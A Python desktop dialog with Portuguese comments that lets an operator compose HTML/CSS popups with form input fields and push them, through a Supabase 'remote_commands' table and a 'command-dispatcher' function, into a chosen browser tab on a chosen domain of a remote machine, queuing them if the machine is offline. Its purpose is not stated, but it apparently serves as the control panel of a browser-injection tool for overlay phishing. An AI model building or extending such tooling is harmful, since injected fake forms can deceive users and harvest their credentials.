"""
Dialog completo para controle de popup (idêntico à versão web)
"""
import customtkinter as ctk
from typing import Dict, Optional
import threading
import json
from src.config.supabase_config import supabase, get_supabase_client
from src.utils.async_helper import run_async


class PopupControlDialog(ctk.CTkToplevel):
    """Dialog completo de popup com tabs e funcionalidades"""
    
    def __init__(self, parent, session_data: Dict, user_id: str, access_token: Optional[str] = None, refresh_token: Optional[str] = None):
        super().__init__(parent)
        
        self.session_data = session_data
        self.user_id = user_id
        self.access_token = access_token
        self.refresh_token = refresh_token
        self.templates = []
        self.selected_template = None
        self.custom_html = ""
        self.custom_css = ""
        self.is_sending = False
        
        # Cliente Supabase autenticado com ambos os tokens
        self.supabase_client = get_supabase_client(access_token, refresh_token)
        
        # Configurar janela
        self.title("📨 Solicitar Popup")
        self.geometry("700x600")
        self.center_window()
        
        # Criar interface
        self.create_widgets()
        
        # Carregar templates
        self._fetch_thread = threading.Thread(target=self.fetch_templates, daemon=False)
        self._fetch_thread.start()
    
    def center_window(self):
        """Centralizar janela na tela"""
        self.update_idletasks()
        x = (self.winfo_screenwidth() // 2) - 350
        y = (self.winfo_screenheight() // 2) - 300
        self.geometry(f'700x600+{x}+{y}')
    
    def create_widgets(self):
        """Criar widgets da interface"""
        # Tabs
        self.tabview = ctk.CTkTabview(self, height=450)
        self.tabview.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Criar tabs
        tab1 = self.tabview.add("Selecionar Template")
        tab2 = self.tabview.add("Preview")
        tab3 = self.tabview.add("Custom HTML")
        
        # === TAB 1: Selecionar Template ===
        self.create_select_tab(tab1)
        
        # === TAB 2: Preview ===
        self.create_preview_tab(tab2)
        
        # === TAB 3: Custom HTML ===
        self.create_custom_tab(tab3)
        
        # Footer com botões
        footer = ctk.CTkFrame(self, fg_color="transparent")
        footer.pack(fill="x", padx=10, pady=10)
        
        btn_cancel = ctk.CTkButton(
            footer,
            text="Cancelar",
            command=self.destroy,
            fg_color="#64748b",
            hover_color="#475569",
            width=120
        )
        btn_cancel.pack(side="left", padx=5)
        
        self.btn_send = ctk.CTkButton(
            footer,
            text="📨 Enviar Popup",
            command=self.send_popup,
            fg_color="#8b5cf6",
            hover_color="#7c3aed",
            width=150
        )
        self.btn_send.pack(side="right", padx=5)
    
    def create_select_tab(self, parent):
        """Criar tab de seleção de template"""
        # Info da sessão
        info_frame = ctk.CTkFrame(parent, fg_color="#1e293b", corner_radius=8)
        info_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkLabel(
            info_frame,
            text=f"🌍 Domínio: {self.session_data['domain']}",
            font=("Roboto", 11),
            anchor="w"
        ).pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(
            info_frame,
            text=f"🔗 URL: {self.session_data['url'][:60]}...",
            font=("Roboto", 10),
            text_color="#94a3b8",
            anchor="w"
        ).pack(fill="x", padx=10, pady=5)
        
        # Dropdown de templates
        ctk.CTkLabel(
            parent,
            text="Selecionar Template:",
            font=("Roboto", 12, "bold"),
            anchor="w"
        ).pack(fill="x", padx=10, pady=(15, 5))
        
        self.template_var = ctk.StringVar(value="Carregando templates...")
        self.template_dropdown = ctk.CTkOptionMenu(
            parent,
            variable=self.template_var,
            values=["Carregando..."],
            command=self.on_template_selected,
            fg_color="#3b82f6",
            button_color="#2563eb",
            button_hover_color="#1d4ed8"
        )
        self.template_dropdown.pack(fill="x", padx=10, pady=5)
        
        # Descrição do template
        self.template_desc = ctk.CTkTextbox(parent, height=150, state="disabled")
        self.template_desc.pack(fill="x", padx=10, pady=10)
    
    def create_preview_tab(self, parent):
        """Criar tab de preview"""
        ctk.CTkLabel(
            parent,
            text="Preview do Popup:",
            font=("Roboto", 12, "bold"),
            anchor="w"
        ).pack(fill="x", padx=10, pady=10)
        
        self.preview_box = ctk.CTkTextbox(parent, height=400)
        self.preview_box.pack(fill="both", expand=True, padx=10, pady=5)
    
    def create_custom_tab(self, parent):
        """Criar tab de HTML customizado"""
        # Helpers para inserir campos
        helpers_frame = ctk.CTkFrame(parent, fg_color="transparent")
        helpers_frame.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkLabel(
            helpers_frame,
            text="Inserir Campos:",
            font=("Roboto", 11, "bold"),
            anchor="w"
        ).pack(fill="x")
        
        buttons_grid = ctk.CTkFrame(helpers_frame, fg_color="transparent")
        buttons_grid.pack(fill="x", pady=5)
        
        fields = [
            ("+ Input Text (input1)", "text", "input1"),
            ("+ Input Text (input2)", "text", "input2"),
            ("+ Textarea (input3)", "textarea", "input3"),
            ("+ Select (input4)", "select", "input4")
        ]
        
        for i, (text, field_type, name) in enumerate(fields):
            btn = ctk.CTkButton(
                buttons_grid,
                text=text,
                command=lambda t=field_type, n=name: self.insert_field(t, n),
                width=150,
                height=30,
                font=("Roboto", 10),
                fg_color="#475569",
                hover_color="#334155"
            )
            row, col = divmod(i, 2)
            btn.grid(row=row, column=col, padx=5, pady=3, sticky="ew")
        
        buttons_grid.columnconfigure(0, weight=1)
        buttons_grid.columnconfigure(1, weight=1)
        
        # HTML
        ctk.CTkLabel(
            parent,
            text="HTML:",
            font=("Roboto", 11, "bold"),
            anchor="w"
        ).pack(fill="x", padx=10, pady=(10, 5))
        
        self.html_box = ctk.CTkTextbox(parent, height=150)
        self.html_box.pack(fill="x", padx=10, pady=5)
        self.html_box.insert("1.0", "<div style='padding:20px;text-align:center;'>\n  <h2>{{domain}}</h2>\n  <p>Personalize seu popup aqui</p>\n</div>")
        
        # CSS
        ctk.CTkLabel(
            parent,
            text="CSS:",
            font=("Roboto", 11, "bold"),
            anchor="w"
        ).pack(fill="x", padx=10, pady=(10, 5))
        
        self.css_box = ctk.CTkTextbox(parent, height=100)
        self.css_box.pack(fill="x", padx=10, pady=5)
        self.css_box.insert("1.0", "body { font-family: Arial; }")
    
    def fetch_templates(self):
        """Buscar templates do Supabase"""
        try:
            response = self.supabase_client.table('popup_templates')\
                .select('*')\
                .order('is_default', desc=True)\
                .execute()
            
            self.templates = response.data if response.data else []
            
            # Atualizar dropdown
            template_names = ["Custom HTML"] + [t['name'] for t in self.templates]
            
            self.after(0, lambda: self.template_dropdown.configure(values=template_names))
            self.after(0, lambda: self.template_var.set("Custom HTML"))
            
        except Exception as e:
            print(f"[PopupDialog] Erro ao buscar templates: {e}")
            self.after(0, lambda: self.template_var.set("Erro ao carregar"))
    
    def on_template_selected(self, choice):
        """Callback quando template é selecionado"""
        if choice == "Custom HTML":
            self.selected_template = None
            self.template_desc.configure(state="normal")
            self.template_desc.delete("1.0", "end")
            self.template_desc.insert("1.0", "Use a aba 'Custom HTML' para criar seu próprio popup.")
            self.template_desc.configure(state="disabled")
        else:
            # Encontrar template
            template = next((t for t in self.templates if t['name'] == choice), None)
            if template:
                self.selected_template = template
                self.template_desc.configure(state="normal")
                self.template_desc.delete("1.0", "end")
                self.template_desc.insert("1.0", f"Domain: {template.get('domain', 'Todos')}\n\nHTML Preview:\n{template['html_content'][:200]}...")
                self.template_desc.configure(state="disabled")
                
                # Atualizar preview
                self.update_preview()
    
    def update_preview(self):
        """Atualizar preview do popup"""
        html = ""
        css = ""
        
        if self.selected_template:
            html = self.selected_template['html_content']
            css = self.selected_template.get('css_styles', '')
        else:
            html = self.html_box.get("1.0", "end-1c")
            css = self.css_box.get("1.0", "end-1c")
        
        # Substituir variáveis
        html = html.replace('{{domain}}', self.session_data['domain'])
        html = html.replace('{{url}}', self.session_data['url'])
        html = html.replace('{{title}}', self.session_data['title'])
        
        css = css.replace('{{domain}}', self.session_data['domain'])
        
        # Mostrar no preview
        preview_content = f"<!-- CSS -->\n<style>\n{css}\n</style>\n\n<!-- HTML -->\n{html}"
        
        self.preview_box.delete("1.0", "end")
        self.preview_box.insert("1.0", preview_content)
    
    def insert_field(self, field_type: str, name: str):
        """Inserir campo de formulário no HTML"""
        templates_map = {
            'text': f'<input type="text" name="{name}" placeholder="Digite aqui..." style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px;">',
            'textarea': f'<textarea name="{name}" rows="4" placeholder="Digite aqui..." style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px;"></textarea>',
            'select': f'<select name="{name}" style="width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:4px;"><option value="">Selecione...</option><option value="opcao1">Opção 1</option><option value="opcao2">Opção 2</option></select>'
        }
        
        field_html = templates_map.get(field_type, '')
        self.html_box.insert("insert", "\n" + field_html)
        
        # Mudar para custom
        self.template_var.set("Custom HTML")
        self.selected_template = None
    
    def send_popup(self):
        """Enviar popup via command-dispatcher"""
        if self.is_sending:
            return
        
        self.is_sending = True
        self.btn_send.configure(state="disabled", text="Enviando...")
        
        def send():
            try:
                # Obter HTML/CSS
                if self.selected_template:
                    html = self.selected_template['html_content']
                    css = self.selected_template.get('css_styles', '')
                else:
                    html = self.html_box.get("1.0", "end-1c")
                    css = self.css_box.get("1.0", "end-1c")
                
                # Substituir variáveis
                html = html.replace('{{domain}}', self.session_data['domain'])
                html = html.replace('{{url}}', self.session_data['url'])
                css = css.replace('{{domain}}', self.session_data['domain'])
                
                # 1. Inserir comando no banco (usando cliente autenticado)
                command_response = self.supabase_client.table('remote_commands').insert({
                    'target_machine_id': self.session_data['machine_id'],
                    'target_tab_id': self.session_data['tab_id'],
                    'target_domain': self.session_data['domain'],
                    'command_type': 'popup',
                    'payload': {
                        'html_content': html,
                        'css_styles': css,
                        'template_id': self.selected_template['id'] if self.selected_template else None
                    },
                    'executed_by': self.user_id,
                    'status': 'pending'
                }).execute()
                
                command_id = command_response.data[0]['id']
                
                # 2. Chamar command-dispatcher (usando cliente autenticado)
                dispatcher_response = self.supabase_client.functions.invoke('command-dispatcher', {
                    'body': {
                        'command_id': command_id,
                        'command_type': 'popup',
                        'target_machine_id': self.session_data['machine_id'],
                        'target_tab_id': self.session_data['tab_id'],
                        'payload': {
                            'html_content': html,
                            'css_styles': css
                        }
                    }
                })
                
                result = json.loads(dispatcher_response.decode('utf-8'))
                
                # 3. Processar resultado
                self.after(0, lambda: self.on_send_complete(result))
                
            except Exception as e:
                print(f"[PopupDialog] Erro ao enviar popup: {e}")
                import traceback
                traceback.print_exc()
                self.after(0, lambda: self.on_send_error(str(e)))
        
        threading.Thread(target=send, daemon=True).start()
    
    def on_send_complete(self, result: Dict):
        """Callback quando envio é concluído"""
        self.is_sending = False
        self.btn_send.configure(state="normal", text="📨 Enviar Popup")
        
        status = result.get('status', 'error')
        
        if status == 'sent':
            self.show_success("✅ Popup enviado via WebSocket!")
            self.after(1500, self.destroy)
        elif status == 'queued':
            self.show_warning("⚠️ Máquina offline. Popup será enviado quando conectar.")
            self.after(2000, self.destroy)
        else:
            self.show_error(f"❌ Erro: {result.get('message', 'Erro desconhecido')}")
    
    def on_send_error(self, error: str):
        """Callback quando há erro no envio"""
        self.is_sending = False
        self.btn_send.configure(state="normal", text="📨 Enviar Popup")
        self.show_error(f"❌ Erro: {error}")
    
    def show_success(self, message: str):
        """Mostrar mensagem de sucesso"""
        self.show_toast(message, "#22c55e")
    
    def show_warning(self, message: str):
        """Mostrar mensagem de aviso"""
        self.show_toast(message, "#f59e0b")
    
    def show_error(self, message: str):
        """Mostrar mensagem de erro"""
        self.show_toast(message, "#ef4444")
    
    def show_toast(self, message: str, color: str):
        """Mostrar toast temporário"""
        toast = ctk.CTkLabel(
            self,
            text=message,
            font=("Roboto", 12),
            fg_color=color,
            corner_radius=6,
            padx=15,
            pady=10
        )
        toast.place(relx=0.5, rely=0.95, anchor="center")
        self.after(3000, toast.destroy)
    
    def destroy(self):
        """Cleanup ao fechar dialog"""
        # Aguardar thread de fetch se ainda rodando
        if hasattr(self, '_fetch_thread') and self._fetch_thread.is_alive():
            self._fetch_thread.join(timeout=1.0)
        
        super().destroy()
